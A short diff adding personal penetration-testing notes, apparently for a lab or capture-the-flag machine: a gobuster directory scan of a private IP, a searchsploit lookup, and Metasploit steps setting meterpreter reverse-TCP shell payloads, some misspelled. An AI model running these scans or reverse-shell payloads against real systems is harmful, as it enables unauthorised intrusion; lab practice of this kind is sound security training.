@@ -1,0 +1,13 @@
+Gobuster command:
+
+gobuster dir -u http://10.129.89.220/ -w /usr/share/wordlists/dirb/common.txt
+
+searchsploit <CMS Name/Package>
+
+metsaploit note:  
+Always run "check" command before running any exploit.
+Try with both x86 and x64 payloads:
+
+set payload linux/x64/meterpreter/reverse_tc
+set payload linux/x86/meterpreter/reverse_tc
+
